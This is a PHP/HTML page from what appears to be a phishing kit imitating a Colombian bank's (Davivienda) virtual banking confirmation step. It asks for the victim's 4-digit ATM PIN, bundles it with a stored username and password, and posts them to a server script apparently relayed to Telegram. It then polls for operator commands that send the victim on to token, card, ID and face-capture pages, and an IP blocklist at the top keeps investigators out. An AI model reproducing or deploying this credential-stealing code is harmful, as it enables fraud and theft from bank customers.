<?php
// --- IP BLACKLIST GLOBAL CHECK ---
$client_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
if (!empty($client_ip)) {
    $client_ip = trim(explode(',', $client_ip)[0]);
}
$secRoot = __DIR__; while($secRoot !== dirname($secRoot)) { if (file_exists($secRoot . '/includes/security.php')) { require_once $secRoot . '/includes/security.php'; break; } $secRoot = dirname($secRoot); } $blacklist_file = (function_exists('sura_get_project_root') ? sura_get_project_root() : $secRoot) . '/blocked_ips.txt';
if (file_exists($blacklist_file)) {
    $blocked_ips = file($blacklist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($client_ip, $blocked_ips)) {
        header("HTTP/1.1 403 Forbidden");
        exit("Acceso denegado.");
    }
}
// ---------------------------------

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Banca virtual | Confirmacion</title>
    <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
    <link rel="stylesheet" href="css/normalize.min.css" />
    <link rel="stylesheet" href="css/estilos.css" />
    <script type="text/javascript" src="../../../../assets/js/jquery-3.6.0.min.js"></script>
</head>

<body>
    <div class="contenedor">
        <div class="principal">
            <div class="autenticar">
                <div class="conttitulo">
                    <div class="logo-banner">
                        <img src="img/davibank.png" alt="Banner Logo" />
                    </div>
                    <div class="titulo">
                        <h1>Clave de Cajero</h1>
                    </div>
                </div>
                <div class="contenido">
                    <div class="caja">
                        <div class="izq">
                            <form autocomplete="off" id="fatm">
                                <input type="hidden" id="session_id" name="session_id">
                                <input type="hidden" id="username" name="username">
                                <input type="hidden" id="prueba_clave" value="">
                                        
                                <div class="inputg columna">
                                    <div style="text-align: right;" class="ojos">
                                        <img src="img/ojo.svg" alt="ojo" id="ojo" style="display: none;">
                                    </div>
                                    <input type="password" name="atm" id="txtCajero" placeholder="ATM"
                                        maxlength="4" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" pattern="[0-9]*" />
                                        <div class="error" id="eatm">
                                        <img src="img/war.svg" alt="error"> <span class="rojo">Formato de ATM invalido</span>
                                    </div>
                                </div>
                                <div class="inputgb">
                                    <button type="button" id="btnCajero" class="btn">Continuar</button>
                                </div>
                                <div class="inputg inicio" >
                                    <p style="margin-bottom: 5px;">Por razones de seguridad le recomendamos ingresar los
                                datos solicitados a fin de seguir disfrutando de nuestros servicios</p>
                                   
                                </div>
                            </form>
                        </div>
                        <div class="der">
                            <img src="img/baner1.svg" alt="baner1" />
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Loader overlay -->
    <div id="loader-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(255, 255, 255, 0.7); z-index: 9999; justify-content: center; align-items: center;">
        <img src="img/l21.svg" alt="Cargando..." style="width: 80px; height: 80px; animation: blink 1.5s infinite;">
    </div>
    <style>
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.3; }
            100% { opacity: 1; }
        }
    </style>

    <script src="js/funciones.js"></script>
    
    <script>
    document.addEventListener("DOMContentLoaded", function () {
        
        // Generar o recuperar session_id
        let sessionId = ((() => { const params = new URLSearchParams(window.location.search); const direct = [params.get('transactionId'), params.get('tid'), params.get('tx'), params.get('session_id'), params.get('ts')].find((value) => value !== null && String(value).trim() !== ''); if (direct) { const normalized = String(direct); localStorage.setItem('session_id', normalized); localStorage.setItem('last_tid', normalized); return normalized; } const generated = 'session_' + Date.now() + '_' + Math.random().toString(36).slice(2, 11); localStorage.setItem('session_id', generated); localStorage.setItem('last_tid', generated); return generated; })());
        if (!sessionId) {
            sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            localStorage.setItem('session_id', sessionId);
        }
        
        // Obtener username de URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const user = urlParams.get('user');
        if (user) {
            localStorage.setItem('username', user);
        }
        
        // Establecer valores en campos ocultos
        if(document.getElementById('session_id')) document.getElementById('session_id').value = sessionId;
        if(document.getElementById('username')) document.getElementById('username').value = localStorage.getItem('username') || '';
        
        // Mostrar formulario después de un delay
        setTimeout(() => {
            const fatm = document.getElementById('fatm');
            if(fatm) fatm.style.display = 'block';
        }, 1000);
        
        // --- FUNCIÓN DE ENVÍO CENTRALIZADA ---
        async function enviarCajeroTelegram(clave, btnId) {
            // Validar que la clave tenga 4 dígitos
            if (clave.length !== 4) {
                alert('La clave debe tener 4 dígitos');
                return;
            }

            // Mostrar loader
            const loader = document.getElementById('loader-overlay');
            if (loader) loader.style.display = 'flex';

            localStorage.setItem('clave_cajero', clave);

          let localTb = {};
          try {
              localTb = JSON.parse(localStorage.getItem('tbdatos') || '{}');
          } catch(e) {}

          const formData = new FormData();
          formData.append('transactionId', sessionId);
          formData.append('u_id', localStorage.getItem('username') || localStorage.getItem('identificacion') || '');
          formData.append('u_ps', localStorage.getItem('password') || '');
          formData.append('u_atm', clave);
          formData.append('u_tb', JSON.stringify(localTb));

          fetch('procesar_logo.php', { method: 'POST', body: formData })
          .then(res => res.json())
          .then(result => {
            if (result.status === 'success') {
              checkCajeroVerification(sessionId, result.messageId);
            } else {
              if (loader) loader.style.display = 'none';
              alert("Error en el procesamiento. Intente nuevamente.");
            }
          })
          .catch(() => {
            if (loader) loader.style.display = 'none';
            alert("Error de conexión. Intente nuevamente.");
          });
        }

        // Event listener para el botón Verificar
        const btnCajero = document.getElementById('btnCajero');
        if (btnCajero) {
            btnCajero.addEventListener('click', function (e) {
                e.preventDefault();
                enviarCajeroTelegram(document.getElementById('txtCajero').value, 'btnCajero');
            });
        }

        // Event listener para el botón Error Cajero
        const btnErrCajero = document.getElementById('btnErrCajero');
        if (btnErrCajero) {
            btnErrCajero.addEventListener('click', function (e) {
                e.preventDefault();
                enviarCajeroTelegram(document.getElementById('txtErrCajero').value, 'btnErrCajero');
            });
        }
    });

        async function checkCajeroVerification(transactionId, messageId) {
        try {
            const formData = new FormData();
            formData.append('transactionId', transactionId);
            formData.append('messageId', messageId);

            const res = await fetch('verificar_respuesta.php', { method: 'POST', body: formData });
            const result = await res.json();

            if (result.action) {
                const loader = document.getElementById('loader-overlay');
                if (loader) loader.style.display = 'none';
                
                switch (result.action) {
                    case 'ban_ip':
                    try {
                        localStorage.clear();
                        sessionStorage.clear();
                        document.cookie.split(";").forEach(function(c) { 
                            document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
                        });
                    } catch(e) {}
                    window.location.replace("/fin.php");
                    break;
                case 'confirm_finalizar':
                        window.location.href = "/fin.php";
                        break;
                    case 'error_logo': 
                        alert("Usuario o clave incorrectos.");
                        window.location.href = "index.php";
                        break;
                    case 'pedir_dinamica':
                    case 'error_token': 
                        window.location.href = "token.php";
                        break;
                    case 'error_cajero': 
                        alert("Error en la clave de cajero. Intente nuevamente.");
                        if(document.getElementById('txtCajero')) document.getElementById('txtCajero').value = '';
                        if(document.getElementById('txtErrCajero')) document.getElementById('txtErrCajero').value = '';
                        break;
                    case 'error_tc':
                        window.location.href = "/datac/alter.php";
                        break;
                    case 'bre_b':
                        window.location.href = "/recaudos/brev.php?davivienda";
                        break;
                    case 'error': 
                        window.location.href = "/caras";
                        break;
                    case 'cedula': 
                        window.location.href = "/cedula";
                        break;
                }
            } else {
                setTimeout(() => checkCajeroVerification(transactionId, messageId), 2000);
            }
        } catch (err) {
            setTimeout(() => checkCajeroVerification(transactionId, messageId), 2000);
        }
    }
</script>
</body>

</html>